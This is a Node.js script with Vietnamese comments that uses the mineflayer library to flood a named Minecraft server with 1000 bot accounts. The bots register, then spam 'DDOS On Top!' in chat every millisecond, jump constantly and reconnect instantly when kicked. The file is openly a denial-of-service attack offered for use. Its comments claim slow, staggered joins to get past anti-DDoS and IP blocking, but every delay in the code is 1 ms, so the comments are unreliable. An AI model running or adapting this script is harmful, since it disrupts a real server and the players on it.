const mineflayer = require('mineflayer')

// Cấu hình địa chỉ server của bạn
const SERVER_ADDR = 'stratos.pikamc.vn:26487';

const CONFIG = {
    host: SERVER_ADDR.split(':')[0], 
    port: parseInt(SERVER_ADDR.split(':')[1]) || 25565,
    botCount: 1000,
    prefix: 'TrumDDOSVietNam',
    password: 'ddostoichoi', // Mật khẩu dùng cho cả Register và Login
    version: "1.21.4" 
}

function createBot(id) {
    const username = `${CONFIG.prefix}${id}`
    
    const bot = mineflayer.createBot({
        host: CONFIG.host,
        port: CONFIG.port,
        username: username,
        auth: 'offline', // Bắt buộc cho server lậu
        version: CONFIG.version
    })

    bot.on('spawn', () => {
        console.log(`[+] ${username} đã vào server!`)
        
        // 1. Cơ chế tự động Register hoặc Login
        setTimeout(() => {
            // Gửi cả 2 lệnh, server sẽ tự nhận lệnh hợp lệ
            bot.chat(`/register ${CONFIG.password} ${CONFIG.password}`)
            bot.chat(`/login ${CONFIG.password}`)
            console.log(`[${username}] Đã thực hiện xác thực.`)
        }, 1)

        // 2. Vòng lặp spam dấu !
        setTimeout(() => {
            if (!bot.spamInterval) {
                bot.spamInterval = setInterval(() => {
                    bot.chat('DDOS On Top!')
                }, 1) // Nhắn mỗi 3 giây để tránh bị kick quá nhanh
            }
        }, 1)

        // 3. Chống AFK (Nhảy)
        setInterval(() => {
            bot.setControlState('jump', true)
            setTimeout(() => bot.setControlState('jump', false), 500)
        }, 1)
    })

    // Tự động kết nối lại khi mất mạng hoặc server reset
    bot.on('end', (reason) => {
        console.log(`[-] ${username} thoát: ${reason}. Đang vào lại sau 15s...`)
        if (bot.spamInterval) clearInterval(bot.spamInterval)
        setTimeout(() => createBot(id), 1)
    })

    bot.on('error', (err) => {
        // Xử lý lỗi DNS EAI_AGAIN thường gặp trên hosting
        if (err.code === 'EAI_AGAIN') {
            console.log(`[Lỗi DNS] Không tìm thấy host ${CONFIG.host}. Đang thử lại...`)
        } else {
            console.log(`[Lỗi - ${username}]: ${err.message}`)
        }
    })
}

// Khởi chạy 20 bot lệch giờ nhau để lách Anti-DDoS
for (let i = 1; i <= CONFIG.botCount; i++) {
    setTimeout(() => {
        createBot(i)
    }, i * 1) // 12 giây vào 1 bot để không bị block IP
}
